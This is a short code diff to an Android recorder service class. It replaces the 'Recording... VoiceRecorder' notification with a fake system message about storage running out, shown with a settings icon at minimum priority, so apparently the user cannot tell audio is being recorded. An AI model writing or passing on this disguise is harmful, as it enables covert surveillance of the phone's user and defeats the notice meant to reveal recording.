@@ -284,9 +284,9 @@ public class RecorderService extends Service {
         // the addAction re-use the same intent to keep the example short
         Notification notification = null;
         notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                    .setContentTitle("Recording... ")
-                    .setContentText("VoiceRecorder")
-                    .setSmallIcon(R.mipmap.ic_launcher)
+                    .setContentTitle("Storage space running out")
+                    .setContentText("This may slow down some apps and system functions")
+                    .setSmallIcon(R.drawable.ic_baseline_settings_24)
                     .setContentIntent(pIntent)
                     .setPriority(Notification.PRIORITY_MIN)
                     .setAutoCancel(true)
